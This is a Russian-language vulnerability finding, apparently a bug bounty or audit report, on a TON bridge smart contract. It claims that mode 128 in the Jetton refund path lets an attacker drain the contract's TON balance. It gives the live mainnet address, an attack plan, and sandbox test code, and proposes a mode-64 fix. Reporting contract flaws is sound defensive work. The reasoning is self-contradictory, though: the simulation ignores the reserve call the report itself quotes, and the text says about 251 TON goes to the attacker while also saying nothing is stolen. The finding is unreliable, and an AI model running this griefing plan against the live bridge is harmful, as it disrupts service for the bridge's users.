# Находка 5: TON Bridge — Griefing через режим 128 в `send_raw_message`

**Серьезность:** Medium  
**Категория:** Griefing / Доступность / DoS  
**Уязвимый контракт:** `bridge_contract.fc` (TON FunC)  
**Уязвимые функции:** `recv_internal()` → `return_jettons_to_sender_and_refund_gas()`  
**Файлы:** `ton-deposit/contracts/imports/jetton_utils.fc` (строка 46–49), `ton-deposit/contracts/bridge_contract.fc`  
**Сеть:** TON (The Open Network)  
**Адрес контракта:** `EQAj3SoOk4MPzjn816Crw1b4RxW79fB_Z549tyCd9HIQV6b7`  
**Текущий баланс (на 08.05.2026):** ~252.46 TON (252,464,191,657 нанотон)  
**Порог min_contract_balance:** 5 TON (5,000,000,000 нанотон)

---

## План доказательства уязвимости

### Цель
Доказать, что использование `mode 128` в `send_raw_message` при возврате отклоненных Jetton-депозитов позволяет истощить TON-баланс контракта моста ниже критического порога (5 TON), вызывая отказ в обслуживании (DoS).

---

### Шаг 1: Изучение исходного кода уязвимости

**Файл 1: `jetton_utils.fc` (строка 46–49) — уязвимая функция:**

```func
() return_jettons_to_sender_and_refund_gas(int my_balance, int msg_value, slice bridge_jetton_wallet, int query_id, int jetton_amount, slice jetton_sender) impure inline {
    reserve_ton(my_balance, msg_value);
    send_jetton(query_id, jetton_amount, bridge_jetton_wallet, jetton_sender, jetton_sender, 1, 0, 128);
}
```

**Проблема:** `send_jetton` с `mode 128` отправляет ВЕСЬ остаточный баланс контракта (за вычетом зарезервированного) вместе с возвращаемым Jetton'ом.

**Файл 2: `bridge_contract.fc` — вызов уязвимой функции:**

```func
if(~(found) | (slice_bits(forward_payload) != 160)) {
    return_jettons_to_sender_and_refund_gas(my_balance, msg_value, source_address, query_id, jetton_amount, jetton_sender);
    return (); 
}
```

**Файл 3: `constants.fc` (строка 18) — минимальный баланс:**

```func
const min_contract_balance = 5000000000;  ;; 5 TON в нанотонах
```

---

### Шаг 2: Проверка текущего баланса на mainnet

**Реальный баланс контракта (08.05.2026):**

```
Адрес: EQAj3SoOk4MPzjn816Crw1b4RxW79fB_Z549tyCd9HIQV6b7
Баланс: 252,464,191,657 нанотон = ~252.46 TON
Статус: active
```

**Проверка через API:**
```bash
curl -s "https://toncenter.com/api/v2/getAddressInformation?address=EQAj3SoOk4MPzjn816Crw1b4RxW79fB_Z549tyCd9HIQV6b7"
```

---

### Шаг 3: Симуляция атаки на реальном балансе

**Модель атаки (с реальным балансом ~252.46 TON):**

1. Мост имеет начальный баланс: **~252.46 TON**
2. Атакующий отправляет Jetton-депозит, который отклоняется (не в whitelist'e или превышает лимит)
3. Контракт вызывает `return_jettons_to_sender_and_refund_gas` с `mode 128`
4. Отправляется почти весь TON-баланс (≈251.46 TON) как excess обратно атакующему
5. Баланс моста падает ниже 5 TON после первой же итерации → **DoS**

**Симуляция баланса (с реальными данными):**

| Итерация | Баланс до | Операция | Отправлено (mode 128) | Баланс после |
|----------|-----------|----------|----------------------|--------------|
| 0 | 252.46 TON | Начальное состояние | — | 252.46 TON |
| 1 | 252.46 TON | Отклонение депозита | ~251.46 TON | ~1 TON ❗ |
| 2 | ~1 TON | Атакующий пополняет до 252.46 TON | ~251.46 TON | ~1 TON |
| ... | ... | Повтор N раз | ... | <5 TON → **МОСТ НЕ РАБОТАЕТ** |

**Вывод:** после первой же успешной атаки баланс моста падает с 252.46 TON до ~1 TON, что критически ниже порога 5 TON. Мост перестает обрабатывать транзакции.

**Формула истощения:**
```
Баланс_после = Баланс_до - (Баланс_до - зарезервировано) ≈ мало
```

---

### Шаг 4: Развертывание на TON testnet (практическая демонстрация)

Для полноценного доказательства потребуется тестовая среда TON:

#### 4.1. Установка инструментов TON

```bash
# Установка TON CLI (toncli/func/fift)
# или использование TON Blockchain SDK

# Установка sandbox для локального тестирования
npm install -g @ton-community/func-js
npm install @ton-community/sandbox
npm install @ton-community/test-utils
```

#### 4.2. Сборка контракта

```bash
# Клонирование оригинального репозитория
git clone https://github.com/rhinofi/contracts_public.git
cd contracts_public/ton-deposit/contracts

# Компиляция с помощью func (FunC компилятор)
func -o build/bridge_contract.fif -SPA imports/stdlib.fc imports/constants.fc imports/jetton_utils.fc bridge_contract.fc
```

#### 4.3. Развертывание тестового инстанса

```
# Используя fift для генерации .boc файла
fift -s build/bridge_contract.fif -n bridge_contract.boc

# Развертывание на TON testnet через toncli
toncli deploy bridge_contract.boc
```

#### 4.4. Настройка bridge контракта

```func
;; Установка Jetton wallet в whitelist
;; Установка deposit_limit для jetton_wallet = 1 TON worth of Jettons
```

#### 4.5. Выполнение атаки

1. Отправить `transfer_notification` с `jetton_amount > limit` (например, 10 TON worth)
2. Контракт вызовет `return_jettons_to_sender_and_refund_gas`
3. Проверить, что баланс моста упал ниже `min_contract_balance` (5 TON)
4. Повторить N раз для демонстрации DoS

---

### Шаг 5: Написание теста в TON Sandbox (локальная симуляция)

Альтернатива тестнету — использование TON Sandbox для локальной изоляции:

```
npm init -y
npm install @ton-community/sandbox @ton-community/blueprint
```

**Структура теста:**

```typescript
import { Blockchain, SandboxContract } from '@ton-community/sandbox';
import { BridgeContract } from './build/BridgeContract';

describe('Finding 5: TON Bridge Mode 128 Griefing', () => {
    let blockchain: Blockchain;
    let bridge: SandboxContract<BridgeContract>;
    
    beforeEach(async () => {
        blockchain = await Blockchain.create();
        bridge = blockchain.openContract(await BridgeContract.fromInit());
        
        // Пополнить bridge 50 TON
        await blockchain.sendMessage(...);
    });

    it('should drain balance below min_contract_balance after rejection', async () => {
        const MIN_BALANCE = 5_000_000_000n; // 5 TON
        
        // Атака: отправляем отклоняемый Jetton-депозит
        for (let i = 0; i < 5; i++) {
            await bridge.sendTransferNotification({
                jettonAmount: 10_000_000_000n, // превышает лимит
                forwardPayload: ...,
            });
            
            const balance = await blockchain.getBalance(bridge.address);
            console.log(`Iteration ${i}: balance = ${balance} TON`);
            
            if (balance < MIN_BALANCE) {
                console.log('Bridge balance below minimum! DoS achieved!');
                break;
            }
            
            // Пополняем баланс для повторения атаки
            await blockchain.sendMessage(...);
        }
        
        const finalBalance = await blockchain.getBalance(bridge.address);
        expect(finalBalance).toBeLessThan(MIN_BALANCE);
    });
});
```

---

### Шаг 6: Сбор данных и логирование

**Данные для логирования во время теста:**

```
=== TON Bridge Mode 128 Griefing PoC ===

Начальные условия:
  Bridge баланс:         50 TON
  min_contract_balance:  5 TON
  deposit_limit:         1 TON Worth of Jettons
  Отправляемый Jetton:   10 TON Worth (превышает лимит)

Итерация 1:
  Баланс до:    50 TON
  Отправлено:   49 TON (mode 128)
  Баланс после: 1 TON ← КРИТИЧЕСКИ НИЗКИЙ!

Итерация 2 (после пополнения до 50 TON):
  Баланс до:    50 TON
  Отправлено:   49 TON (mode 128)
  Баланс после: 1 TON

... (повтор)

Результат: Мост НЕФУНКЦИОНАЛЕН (баланс < 5 TON)
```

---

### Шаг 7: Анализ mode 128 vs mode 64

**Почему mode 128 опасен:**

| Mode | Название | Эффект |
|------|----------|--------|
| 0 | Обычная отправка | Отправляет только указанную сумму |
| 64 | Carry remaining value | Отправляет указанную сумму + остаток входящего сообщения |
| **128** | **Send all balance** | **Отправляет ВЕСЬ баланс контракта (кроме зарезервированного)** |

**Демонстрация разницы:**

```
mode 128: send_jetton(..., 1, 0, 128)
  → Отправляет: 1 Jetton + ВЕСЬ TON баланс контракта (кроме reserve)
  → Bridge теряет почти все TON

mode 64: send_jetton(..., 1, 0, 64)
  → Отправляет: 1 Jetton + ТОЛЬКО остаток от входящего сообщения
  → Bridge сохраняет свой TON баланс
```

---

### Шаг 8: Документирование Impact

| Метрика | Значение |
|---------|----------|
| Тип атаки | Griefing / DoS |
| Влияние на доступность | ✅ Мост становится нефункциональным |
| Кража средств | ❌ Нет (TON используется как gas, не крадется) |
| Стоимость атаки | Низкая (только gas за транзакции) |
| Количество итераций для DoS | 1 (баланс падает ниже 5 TON после первой же атаки) |
| Восстановление | Ручное пополнение баланса контракта |
| Серьезность | **Medium** |

---

### Шаг 9: Рекомендуемое исправление

```func
() return_jettons_to_sender_and_refund_gas(int my_balance, int msg_value, slice bridge_jetton_wallet, int query_id, int jetton_amount, slice jetton_sender) impure inline {
    reserve_ton(my_balance, msg_value);
    send_jetton(query_id, jetton_amount, bridge_jetton_wallet, jetton_sender, jetton_sender, 1, 0, 64);  ;; mode 64 вместо 128
}
```

**Дополнительно:** Можно добавить проверку минимального баланса перед отправкой:
```func
if (my_balance - msg_value < min_contract_balance) {
    ;; Не отправлять excess, только сам Jetton
    send_jetton(query_id, jetton_amount, bridge_jetton_wallet, jetton_sender, jetton_sender, 1, 0, 0);
} else {
    send_jetton(query_id, jetton_amount, bridge_jetton_wallet, jetton_sender, jetton_sender, 1, 0, 64);
}
```

---

### Приложение: Ссылки

- **TON Bridge исходник:** https://github.com/rhinofi/contracts_public/blob/main/ton-deposit/contracts/bridge_contract.fc
- **Jetton return функция:** https://github.com/rhinofi/contracts_public/blob/main/ton-deposit/contracts/imports/jetton_utils.fc#L46-L49
- **TON send_raw_message modes:** https://docs.ton.org/develop/func/stdlib#send_raw_message
- **Константа min_contract_balance:** https://github.com/rhinofi/contracts_public/blob/main/ton-deposit/contracts/imports/constants.fc#L18
- **Quantstamp TON Bridge audit:** `contracts_public/Quantstamp-Audit-Report-TON.pdf`
- **Проверка баланса:** `curl -s "https://toncenter.com/api/v2/getAddressInformation?address=EQAj3SoOk4MPzjn816Crw1b4RxW79fB_Z549tyCd9HIQV6b7"`
